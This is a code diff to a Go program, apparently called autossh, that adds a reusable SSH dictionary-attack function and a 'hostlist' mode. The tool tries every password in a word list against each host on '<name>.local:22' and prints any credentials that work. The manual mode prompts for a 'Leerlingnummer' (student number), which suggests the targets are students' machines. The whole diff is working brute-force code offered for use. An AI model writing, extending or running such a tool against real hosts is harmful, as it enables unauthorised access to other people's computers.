@@ -3,50 +3,79 @@ package main
 import (
 	"fmt"
 	"log"
+	"math"
 	"os"
 
 	"github.com/cfschilham/autossh/internal/loadcfg"
 	"github.com/cfschilham/autossh/internal/sshconn"
 )
 
+func dictAttack(hostname string, dict *loadcfg.Dict, verbose bool) {
+	if !verbose {
+		fmt.Printf("Attempting to connect to '%s'\n", hostname+"@"+hostname+".local:22")
+	}
+
+	for _, pwd := range dict.Pwds() {
+		if verbose {
+			fmt.Printf("Attempting to establish SSH connection at '%s' using password '%s'\n", hostname+"@"+hostname+".local:22", pwd)
+		}
+		if err := sshconn.SSHConn(hostname+".local:22", hostname, pwd, ""); err != nil {
+			if verbose {
+				log.Println("failed to connect: " + err.Error())
+			}
+		} else {
+			fmt.Println("Connection successfully established!")
+			fmt.Printf("Host: '%s' | Pass: '%s'\n", hostname+"@"+hostname+".local", pwd)
+			break
+		}
+	}
+
+	if !verbose {
+		fmt.Println("Host not vulnerable")
+	}
+}
+
 func main() {
+	fmt.Println("Loading cfg/config.yml...")
 	config, err := loadcfg.LoadConfig()
 	if err != nil {
 		log.Fatalln(err)
 	}
-	dict, err := loadcfg.LoadDict(config.DictPath())
+
+	fmt.Printf("Loading %s...\n", config.DictPath())
+	dict, err := loadcfg.LoadDict("../" + config.DictPath())
 	if err != nil {
 		log.Fatalln(err)
 	}
 
-	if config.Mode() == "manual" {
+	switch config.Mode() {
+	case "manual":
 		var hostname string
-
 		for {
 			fmt.Print("Leerlingnummer (type 'exit' to exit): ")
 			fmt.Scanln(&hostname)
 			if hostname == "exit" {
 				os.Exit(0)
 			}
-
-			for _, entry := range dict.Pwds() {
-				log.Printf("Attempting to establish SSH connection at '%s' using password '%s'\n", hostname+"@"+hostname+".local:22", entry)
-				if err := sshconn.SSHConn(hostname+".local:22", hostname, entry, ""); err != nil {
-					if config.Verbose() {
-						log.Println(err)
-					}
-					log.Printf("Failed to connect\n")
-				} else {
-					log.Printf("Connection successfully established!\n")
-					log.Printf("Host: '%s' | Pass: '%s'\n", hostname+"@"+hostname+".local", entry)
-					break
-				}
-			}
+			dictAttack(hostname, dict, config.Verbose())
 		}
 
-	} else if config.Mode() == "json" {
-		log.Fatalln("cfg/config.yml: whoops, JSON mode is not supported yet!")
-	} else {
-		log.Fatalf("cfg/config.yml: whoops, '%s' is not a valid mode\n", config.Mode())
+	case "hostlist":
+		fmt.Printf("Loading %s...\n", config.HostlistPath())
+		hostlist, err := loadcfg.LoadHostlist("../" + config.HostlistPath())
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		for i, hostname := range hostlist.Hosts() {
+			fmt.Printf("Hostlist %d%% complete\n", int(math.Round(float64(i)/float64(len(hostlist.Hosts()))*100)))
+			dictAttack(hostname, dict, config.Verbose())
+		}
+		fmt.Println("Hostlist 100% complete")
+
+	case "json":
+		log.Fatalf("cfg/config.yml: mode '%s' is not supported yet!", config.Mode())
+	default:
+		log.Fatalf("cfg/config.yml: mode '%s' does not exist!", config.Mode())
 	}
 }
